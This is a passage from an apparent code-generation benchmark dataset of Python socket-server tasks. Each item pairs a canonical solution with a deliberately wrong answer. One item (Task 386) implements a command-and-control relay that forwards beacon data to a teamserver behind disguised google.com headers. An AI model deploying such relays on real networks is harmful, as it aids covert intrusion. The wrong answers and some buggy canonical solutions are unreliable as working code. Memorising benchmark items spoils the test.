    "Canonical_solution": "import socket\nimport select\nimport time\nimport json\nfrom hashlib import sha256\nimport hmac\nimport tinytuya\n\nbind_host = ''\nbind_port = 6668\nreal_key = b'thisisarealkey00'\n\ndef handle_tuya_communication():\n    srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((bind_host, bind_port))\n    srv.listen(1)\n\n    client = None\n    tmp_key = real_key\n    seqno = 1\n    local_nonce = str(time.time() * 1000000)[:16].encode('utf8')\n\n    while True:\n        r = [srv]\n        if client:\n            r.append(client)\n        w = []\n        x = []\n\n        r, w, x = select.select(r, w, x, 1)\n\n        for sock in r:\n            if sock is srv:\n                if client:\n                    client.close()\n                    client = None\n                client, addr = sock.accept()\n                client.setblocking(False)\n                tmp_key = real_key\n                seqno = 1\n                continue\n\n            if sock is not client:\n                continue\n\n            data = sock.recv(4096)\n            if not data:\n                client.close()\n                client = None\n                continue\n\n            m = tinytuya.unpack_message(data, hmac_key=tmp_key, no_retcode=True)\n\n            if m.cmd == tinytuya.SESS_KEY_NEG_START:\n                tmp_key = real_key\n                payload = m.payload\n                remote_nonce = payload\n                miv = remote_nonce[:12]\n                hmac_check = hmac.new(real_key, remote_nonce, sha256).digest()\n                msg = tinytuya.TuyaMessage(seqno, tinytuya.SESS_KEY_NEG_RESP, 0, local_nonce+hmac_check, 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            elif m.cmd == tinytuya.SESS_KEY_NEG_FINISH:\n                rkey_hmac = hmac.new(real_key, local_nonce, sha256).digest()\n                tmp_key = bytes([a^b for (a,b) in zip(remote_nonce,local_nonce)])\n                cipher = tinytuya.AESCipher(real_key)\n                tmp_key = cipher.encrypt(tmp_key, use_base64=False, pad=False, iv=miv)[12:28]\n            elif m.cmd == tinytuya.DP_QUERY_NEW:\n                resp = {'protocol': 4, 't': int(time.time()), 'data': {'dps': {'20': True, '21': 'white', '22': 946, '23': 3, '24': '014a03e803a9', '25': '04464602007803e803e800000000464602007803e8000a00000000', '26': 0, '34': False}}}\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, json.dumps(resp).encode('ascii'), 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)\n            else:\n                msg = tinytuya.TuyaMessage(seqno, 16, 0, b'json obj data unvalid', 0, True, tinytuya.PREFIX_6699_VALUE, True)\n                seqno += 1\n                data = tinytuya.pack_message(msg, hmac_key=tmp_key)\n                client.sendall(data)",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport select\nimport hmac\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport struct\nimport os\n\nbind_host = '::1'\nbind_port = 6668\nreal_key = b'secret_key_123456'\n\ndef create_aes_cipher(key):\n    return AES.new(key, AES.MODE_CBC, iv=os.urandom(16))\n\ndef generate_nonce():\n    return os.urandom(16)\n\ndef calculate_hmac(key, message):\n    return hmac.new(key, message, hashlib.sha256).digest()\n\ndef encrypt_message(cipher, message):\n    return cipher.encrypt(pad(message, AES.block_size))\n\ndef decrypt_message(cipher, ciphertext):\n    return unpad(cipher.decrypt(ciphertext), AES.block_size)\n\ndef handle_client(client_socket, address, sessions):\n    try:\n        while True:\n            readable, _, _ = select.select([client_socket], [], [])\n            if client_socket in readable:\n                data = client_socket.recv(1024)\n                if not data:\n                    break\n\n                # Parse message\n                seq, msg_type, payload = parse_message(data)\n\n                if msg_type == SESS_KEY_NEG_START:\n                    handle_session_start(client_socket, address, seq, payload, sessions)\n                elif msg_type == SESS_KEY_NEG_FINISH:\n                    handle_session_finish(client_socket, address, seq, payload, sessions)\n                elif msg_type == DP_QUERY_NEW:\n                    handle_dp_query(client_socket, address, seq, payload, sessions)\n                else:\n                    send_error_response(client_socket, seq, \"Unknown message type\")\n\n    except Exception as e:\n        print(f\"Error handling client {address}: {e}\")\n    finally:\n        client_socket.close()\n        if address in sessions:\n            del sessions[address]\n\ndef parse_message(data):\n    seq = struct.unpack('>I', data[:4])[0]\n    msg_type = data[4]\n    payload = data[5:]\n    return seq, msg_type, payload\n\ndef handle_session_start(client_socket, address, seq, payload, sessions):\n    nonce = generate_nonce()\n    sessions[address] = {'nonce': nonce}\n    send_response(client_socket, seq, nonce)\n\ndef handle_session_finish(client_socket, address, seq, payload, sessions):\n    if address not in sessions:\n        send_error_response(client_socket, seq, \"Session not started\")\n        return\n\n    nonce = sessions[address]['nonce']\n    if not hmac.compare_digest(nonce, payload[:16]):\n        send_error_response(client_socket, seq, \"Invalid nonce\")\n        return\n\n    temp_key = payload[16:]\n    cipher = create_aes_cipher(temp_key)\n    sessions[address]['cipher'] = cipher\n    send_response(client_socket, seq, b'ACK')\n\ndef handle_dp_query(client_socket, address, seq, payload, sessions):\n    if address not in sessions or 'cipher' not in sessions[address]:\n        send_error_response(client_socket, seq, \"Session not established\")\n        return\n\n    cipher = sessions[address]['cipher']\n    decrypted_payload = decrypt_message(cipher, payload)\n    # Mock response\n    response_data = b'state=on'\n    encrypted_response = encrypt_message(cipher, response_data)\n    send_response(client_socket, seq, encrypted_response)\n\ndef send_response(client_socket, seq, payload):\n    response = struct.pack('>IB', seq, 0) + payload\n    client_socket.sendall(response)\n\ndef send_error_response(client_socket, seq, error_msg):\n    response = struct.pack('>IB', seq, 1) + error_msg.encode('utf-8')\n    client_socket.sendall(response)\n\ndef main():\n    server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server_socket.bind((bind_host, bind_port))\n    server_socket.listen(5)\n    print(f\"Server listening on {bind_host}:{bind_port}\")\n\n    sessions = {}\n    while True:\n        readable, _, _ = select.select([server_socket], [], [])\n        if server_socket in readable:\n            client_socket, address = server_socket.accept()\n            print(f\"Accepted connection from {address}\")\n            handle_client(client_socket, address, sessions)\n\nif __name__ == \"__main__\":\n    main()\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Implement a TCP server class that receives OAuth tokens through a local socket connection, handling the incoming HTTP request and extracting the authorization code or error message.\n\nClass Description: OAuthTokenReceiver is a class that creates a TCP server to listen for OAuth token responses on a specified local port. It handles the HTTP response, extracts the authorization code, and manages error cases.\n\nAttributes:\nport: int - The local port number on which the server will listen for incoming OAuth token responses (default: 31337)\n\nMethods:\nreceive_oauth_token: receive_oauth_token() -> str - Listens for an incoming connection, receives the OAuth token response, sends an HTTP success response, and returns the extracted authorization code. Raises an exception if the response contains an error description.",
    "Canonical_solution": "import socket\nimport re\nimport urllib.parse\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('127.0.0.1', self.port))\n        sock.listen(1)\n        conn, addr = sock.accept()\n        data = conn.recv(1024)\n        conn.sendall('HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><head><title>Recon-ng</title></head><body>Response received. Return to Recon-ng.</body></html>')\n        conn.close()\n        \n        if 'error_description' in data:\n            error = urllib.parse.unquote_plus(re.search(r'error_description=([^\\s&]*)', data).group(1))\n            raise Exception(error)\n        \n        authorization_code = re.search(r'code=([^\\s&]*)', data).group(1)\n        return authorization_code",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self) -> str:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind(('localhost', self.port))\n            s.listen()\n            conn, addr = s.accept()\n            with conn:\n                data = conn.recv(4096)\n                response = data.decode('utf-8')\n                if 'error_description' in response:\n                    raise Exception(\"OAuth Error: \" + response.split('error_description=\"')[1].split('\"')[0])\n                else:\n                    auth_code = response.split('code=')[1].split('&')[0]\n                    conn.sendall(b'HTTP/1.1 200 OK\\r\\n\\r\\n')\n                    return auth_code\n```"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport requests\n\ndef cc2_tcp_server():\n    host = '0.0.0.0'\n    port = 12345\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen()\n        print(f\"Server listening on {host}:{port}\")\n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print(f\"Connected by {addr}\")\n                while True:\n                    data = conn.recv(1024)\n                    if not data:\n                        break\n                    message = data.decode('utf-8')\n                    bid, metadata = parseRawData(message)\n                    if message.startswith('read'):\n                        beacon_data = read_cs_teamserver(metadata)\n                        conn.sendall(beacon_data.encode('utf-8'))\n                    elif message.startswith('write'):\n                        write_cs_teamserver(bid, metadata)\n                        conn.sendall(b'Write operation completed'.encode('utf-8'))\n\ndef read_cs_teamserver(metadata):\n    url = 'http://teamserver/api/read'\n    params = {'metadata': metadata}\n    response = requests.get(url, params=params)\n    if response.status_code == 200:\n        return find_beacon_data('<BEACON>', '</BEACON>', response.text)\n    return ''\n\ndef write_cs_teamserver(id, metadata):\n    url = f'http://teamserver/api/write/{id}'\n    data = {'metadata': metadata}\n    requests.post(url, json=data)\n\ndef parseRawData(rawData):\n    parts = rawData.split('|')\n    bid = parts[0]\n    metadata = '|'.join(parts[1:])\n    return bid, metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    start = data.find(prefix) + len(prefix)\n    end = data.find(suffix, start)\n    if start != -1 and end != -1:\n        return data[start:end]\n    return ''\n```"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a TCP server that collects and serves Jetson device statistics using the jtop library, with optional HTTP response formatting.\n\nFunction Description: The function establishes a TCP server that listens for incoming connections. When a client connects, it retrieves system statistics from the Jetson device using jtop, formats them as JSON, and sends them to the client. The function can optionally wrap the JSON data in a basic HTTP response.\n\nInput:\n- host (str, optional): IP address to bind the server to (default: \"127.0.0.1\")\n- port (int, optional): Port number to listen on (default: 65432)\n- http (bool, optional): Flag to enable HTTP response formatting (default: False)\n\nOutput: None (The function runs indefinitely until interrupted or an error occurs, sending data to connected clients but not returning any value)",
    "Canonical_solution": "import socket\nimport json\nfrom jtop import jtop, JtopException\n\ndef jtop_server(host=\"127.0.0.1\", port=65432, http=False):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind((host, port))\n    sock.listen(1)\n    \n    try:\n        with jtop() as jetson:\n            while jetson.ok():\n                conn, addr = sock.accept()\n                stats = json.dumps(jetson.stats)\n                if http:\n                    message = \"HTTP/1.1 200 OK\\r\\nHost: {host}:{port}\\r\\nContent-Type: application/json\\r\\nContent-Length: {length}\\r\\n\\r\\n{stats}\"\n                    conn.send(message.format(host=host, port=port, length=len(stats), stats=stats.encode()))\n                else:\n                    conn.send(stats.encode())\n                conn.close()\n    except JtopException as e:\n        print(e)\n    except Exception as e:\n        print(e)\n    finally:\n        sock.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport json\nfrom jtop import jtop\n\ndef start_server(host=\"127.0.0.1\", port=65432, http=False):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen()\n        print(f\"Server listening on {host}:{port}\")\n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print(f\"Connected by {addr}\")\n                with jtop() as jetson:\n                    stats = {\n                        \"CPU\": jetson.cpu,\n                        \"GPU\": jetson.gpu,\n                        \"RAM\": jetson.ram,\n                        \"Disk\": jetson.disk,\n                        \"Power\": jetson.power,\n                        \"Temperature\": jetson.temperature\n                    }\n                    response_data = json.dumps(stats)\n                    if http:\n                        response = f\"HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nContent-Length: {len(response_data)}\\r\\n\\r\\n{response_data}\"\n                    else:\n                        response = response_data\n                    conn.sendall(response.encode('utf-8'))\n```"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a TCP server class that handles incoming client connections, receives data, and writes it to a file, with options for debugging and multiprocessing support.\n\nClass Description: EventGeneric is a TCP server implementation that listens for incoming connections, receives byte data from clients, and writes it to a binary file. It supports running in a separate process and provides debugging capabilities through logging.\n\nAttributes:\n- name: str - Identifier for the event instance and log file\n- isDebug: bool - Flag to enable debug logging\n- shared_key: Any - Optional shared key for inter-process communication\n- port: int - TCP port to listen on (auto-assigned if not specified)\n- addr: str - IP address to bind to (defaults to \"0.0.0.0\")\n- file: str - Path to the output binary file\n- logger: logging.Logger - Debug logger instance (only when isDebug=True)\n\nMethods:\n- __init__(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> None - Initializes the TCP server with optional address, port, name, shared key, and debug flag\n- serve() -> None - Main server loop that binds to the socket, accepts connections, and handles data reception\n- spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process] - Static method to create and start the server in a separate process, returns the port number and process object",
    "Canonical_solution": "import socket\nimport multiprocessing\nimport os\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        if port is None:\n            self.port = get_free_port()\n        else:\n            self.port = port\n        if addr is not None:\n            self.addr, _ = addr\n        else:\n            self.addr = \"0.0.0.0\"\n        self.file = f\"./{self.name}.bin\"\n\n    def serve(self):\n        if self.isDebug:\n            self.logger = get_file_logger(self.name, level=\"DEBUG\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        local_addr_port = (self.addr, self.port)\n        sock.bind(local_addr_port)\n        sock.listen(1)\n\n        try:\n            conn, addr = sock.accept()\n            if self.isDebug:\n                self.logger.debug(f\"Open connection from {addr[0]}:{addr[1]}\")\n                event_file = open(self.file, \"wb\")\n            try:\n                while True:\n                    data = conn.recv(1, socket.MSG_WAITALL)\n                    if data:\n                        event_file.write(data)\n                    else:\n                        break\n                        raise KeyboardInterrupt\n            except KeyboardInterrupt:\n                pass\n            finally:\n                try:\n                    if self.isDebug:\n                        os.remove(self.file)\n                except OSError:\n                    pass\n                conn.close()\n                if self.isDebug:\n                    self.logger.debug(f\"Close connection from {addr[0]}:{addr[1]}\")\n            sock.close()\n        except KeyboardInterrupt:\n            pass\n        except BrokenPipeError:\n            pass\n        finally:\n            sock.close()\n            if self.isDebug:\n                self.logger.debug(f\"Closed listen on {self.addr}:{self.port}\")\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        event = EventGeneric(addr, port, name, shared_key, isDebug)\n        p = multiprocessing.Process(target=event.serve)\n        p.start()\n        return event.port, p",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport multiprocessing\nimport logging\nfrom typing import Any, Tuple\n\nclass EventGeneric:\n    def __init__(self, addr=\"0.0.0.0\", port=None, name='events', shared_key=None, isDebug=False) -> None:\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        self.port = port or socket.socket().getsockname()[1]\n        self.addr = addr\n        self.file = f\"{name}.bin\"\n        self.logger = logging.getLogger(name) if isDebug else None\n        if self.isDebug:\n            logging.basicConfig(level=logging.DEBUG)\n\n    def serve(self) -> None:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind((self.addr, self.port))\n            s.listen()\n            if self.isDebug:\n                self.logger.debug(f\"Server {self.name} listening on {self.addr}:{self.port}\")\n            while True:\n                conn, addr = s.accept()\n                with conn:\n                    if self.isDebug:\n                        self.logger.debug(f\"Connected by {addr}\")\n                    data = conn.recv(1024)\n                    while data:\n                        with open(self.file, 'ab') as f:\n                            f.write(data)\n                        data = conn.recv(1024)\n\n    @staticmethod\n    def spawn(addr=\"0.0.0.0\", port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process]:\n        server = EventGeneric(addr, port, name, shared_key, isDebug)\n        process = multiprocessing.Process(target=server.serve)\n        process.start()\n        return server.port, process\n```"
  },
  {
    "Task_id": 39,
    "Instruction": "Task Description: Create a Python class that handles downloading files from a given URL and provides methods to retrieve the file name and read the file content.\n\nClass Description: The `UrlFile` class is designed to download files from a specified URL, manage temporary storage of the downloaded file, and provide methods to access the file name and content. It uses the `httpx` library for HTTP requests and handles temporary file storage with `tempfile`.\n\nAttributes:\n\n- url: str - The URL from which the file will be downloaded.\n- name: Optional[str] - An optional custom name for the downloaded file. If not provided, the name is derived from the URL.\n\nMethods:\n\n- get_filename() -> Optional[str] - Returns the filename derived from the URL or the custom name if provided.\n- read() -> Any - Downloads the file from the URL, saves it to a temporary directory, and returns a file-like object for reading the content. Raises an exception if the download fails or if the filename cannot be determined.",
    "Canonical_solution": "import httpx\nfrom pathlib import Path\nfrom typing import Any, Optional\nfrom tempfile import TemporaryDirectory\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n\n    def get_filename(self) -> Optional[str]:\n        return self.name or self.url.split(\"/\")[-1]\n\n    def read(self) -> Any:\n        logger.debug(f\"Downloading url: {self.url}\")\n        with httpx.Client() as client:\n            response = client.get(self.url)\n            response.raise_for_status()\n\n            with TemporaryDirectory() as temp_dir:\n                file_name = self.get_filename()\n                if file_name is None:\n                    raise ValueError(\"Could not determine a file name, please set `name`\")\n\n                file_path = Path(temp_dir).joinpath(file_name)\n                file_path.write_bytes(response.content)\n                logger.debug(f\"File downloaded and saved to {file_path.name}\")\n                return file_path.open(\"rb\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport httpx\nimport tempfile\nfrom typing import Optional\n\nclass UrlFile:\n    def __init__(self, url: str, name: Optional[str] = None):\n        self.url = url\n        self.name = name\n        self._temp_file = None\n\n    def get_filename(self) -> Optional[str]:\n        if self.name:\n            return self.name\n        try:\n            response = httpx.head(self.url)\n            response.raise_for_status()\n            content_disposition = response.headers.get('content-disposition')\n            if content_disposition:\n                filename = content_disposition.split('filename=')[-1].strip('\"\\'')\n                return filename\n            else:\n                return self.url.split('/')[-1]\n        except Exception:\n            return None\n\n    def read(self):\n        try:\n            response = httpx.get(self.url)\n            response.raise_for_status()\n            self._temp_file = tempfile.NamedTemporaryFile(delete=False)\n            self._temp_file.write(response.content)\n            self._temp_file.close()\n            return open(self._temp_file.name, 'rb')\n        except Exception as e:\n            raise Exception(f\"Failed to download file from {self.url}: {str(e)}\")\n```"
  },
  {
    "Task_id": 393,
    "Instruction": "Task Description: Implement a TCP server in Python that listens for incoming client connections, processes received commands, and sends responses back to the client. The server should handle multiple commands and arguments, and provide appropriate acknowledgments or negative acknowledgments based on command execution.\n\nFunction Description: The function `do_tcp_server` establishes a TCP server that listens on a specified port, accepts client connections, receives and processes commands, and sends responses. It uses a handler function to process commands and arguments, and manages the connection lifecycle.\n\nInput:\n- `client`: [Object] - A client object that provides a printer method for sending data.\n- `arguments`: [Dictionary] - A dictionary containing server configuration, including the port number under the key \"--tcpport\".\n- `handler`: [Function] - A callback function that processes commands and arguments. It takes two parameters: the command string and the parsed arguments, and returns a boolean indicating success (True for <ACK>, False for <NAK>).\n\nOutput:\n- None. The function runs indefinitely, handling client connections and commands until manually stopped. Responses are sent back to the client via the TCP connection.",
    "Canonical_solution": "import socket\n\ndef do_tcp_server(client, arguments, handler):\n    def tcpprint(arg):\n        if isinstance(arg, bytes) or isinstance(arg, bytearray):\n            return connection.sendall(arg)\n        else:\n            return connection.sendall(bytes(str(arg), 'utf-8'))\n\n    client.printer = tcpprint\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    port = int(arguments[\"--tcpport\"])\n    server_address = ('localhost', port)\n    print('starting up on %s port %s' % server_address)\n    sock.bind(server_address)\n    sock.listen(1)\n    response = None\n    while True:\n        print('waiting for a connection')\n        connection, client_address = sock.accept()\n        try:\n            print('connection from', client_address)\n            while True:\n                data = connection.recv(4096).decode('utf-8')\n                if data == '':\n                    break\n                print('received %s' % data)\n                if data:\n                    print('handling request')\n                    lines = data.split(\"\\n\")\n                    for line in lines:\n                        if \":\" in line:\n                            cmd = line.split(\":\")[0]\n                            marguments = line.split(\":\")[1]\n                            try:\n                                opts = parse_args(cmd, marguments, arguments)\n                            except:\n                                response = \"Wrong arguments\\n<NAK>\\n\"\n                                opts = None\n                            if opts is not None:\n                                if handler(cmd, opts):\n                                    response = \"<ACK>\\n\"\n                                else:\n                                    response = \"<NAK>\\n\"\n                            connection.sendall(bytes(response, 'utf-8'))\n        finally:\n            connection.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nimport threading\n\ndef do_tcp_server(client, arguments, handler):\n    port = int(arguments.get(\"--tcpport\", 12345))\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', port))\n    server_socket.listen(5)\n    print(f\"Server listening on port {port}\")\n\n    def handle_client(client_socket):\n        try:\n            while True:\n                data = client_socket.recv(1024).decode('utf-8').strip()\n                if not data:\n                    break\n                command, *args = data.split()\n                result = handler(command, args)\n                response = \"<ACK>\" if result else \"<NAK>\"\n                client_socket.send(response.encode('utf-8'))\n        finally:\n            client_socket.close()\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f\"Accepted connection from {addr}\")\n        client_thread = threading.Thread(target=handle_client, args=(client_socket,))\n        client_thread.start()"
  },
  {
    "Task_id": 397,
    "Instruction": "Task Description: Create a Python function that implements a TCP server which listens for client connections and sends the current server time upon connection.\n\nFunction Description: The function sets up a TCP server socket using IPv4, binds it to a specified IP address and port, listens for incoming connections, and sends the current datetime to each connected client before closing the connection. The server runs indefinitely until manually stopped.\n\nInput: None\n\nOutput: None (The function runs indefinitely, printing connection messages to console and sending datetime to clients)",
    "Canonical_solution": "from socket import socket, SOCK_STREAM, AF_INET\nfrom datetime import datetime\n\ndef main():\n    server = socket(family=AF_INET, type=SOCK_STREAM)\n    server.bind(('192.168.1.2', 6789))\n    server.listen(512)\n    print('\u670d\u52a1\u5668\u542f\u52a8\u5f00\u59cb\u76d1\u542c...')\n    while True:\n        client, addr = server.accept()\n        print(str(addr) + '\u8fde\u63a5\u5230\u4e86\u670d\u52a1\u5668.')\n        client.send(str(datetime.now()).encode('utf-8'))\n        client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nfrom datetime import datetime\n\ndef tcp_server():\n    host = '127.0.0.1'  # Localhost\n    port = 65432        # Port to listen on\n\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind((host, port))\n        s.listen()\n        print(f\"Server listening on {host}:{port}\")\n        \n        while True:\n            conn, addr = s.accept()\n            with conn:\n                print(f\"Connected by {addr}\")\n                current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n                conn.sendall(current_time.encode('utf-8'))"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Implement a TCP server using Python's socket module with asynchronous I/O operations managed by a custom scheduler. The server should handle multiple client connections, echo received data back to clients, and properly manage socket resources.\n\nClass Description: The implementation consists of several classes that work together to create an asynchronous TCP server. The main classes include Socket (a wrapper for socket operations), ReadSocket/WriteSocket/AcceptSocket (operation handlers), and EchoServer (the main server logic).\n\nAttributes:\n\n- Socket._sock: socket.socket - The underlying socket object being wrapped\n- ReadSocket.sock: socket.socket - The socket to read from\n- ReadSocket.nbytes: int - Maximum bytes to read\n- WriteSocket.sock: socket.socket - The socket to write to\n- WriteSocket.data: bytes - Data to be sent\n- AcceptSocket.sock: socket.socket - The socket to accept connections from\n- EchoServer.sched: object - The scheduler instance managing tasks\n\nMethods:\n\n- Socket.__init__(sock: socket.socket) -> None - Initialize with a socket object\n- Socket.recv(maxbytes: int) -> ReadSocket - Create a read operation\n- Socket.send(data: bytes) -> WriteSocket - Create a write operation\n- Socket.accept() -> AcceptSocket - Create an accept operation\n- Socket.__getattr__(name: str) -> Any - Proxy attribute access to underlying socket\n- ReadSocket.handle_yield(sched: object, task: object) -> None - Register read operation with scheduler\n- ReadSocket.handle_resume(sched: object, task: object) -> None - Complete read operation\n- WriteSocket.handle_yield(sched: object, task: object) -> None - Register write operation with scheduler\n- WriteSocket.handle_resume(sched: object, task: object) -> None - Complete write operation\n- AcceptSocket.handle_yield(sched: object, task: object) -> None - Register accept operation with scheduler\n- AcceptSocket.handle_resume(sched: object, task: object) -> None - Complete accept operation\n- EchoServer.__init__(addr: tuple, sched: object) -> None - Initialize server with address and scheduler\n- EchoServer.server_loop(addr: tuple) -> generator - Main server loop accepting connections\n- EchoServer.client_handler(client: Socket) -> generator - Handle client communication",
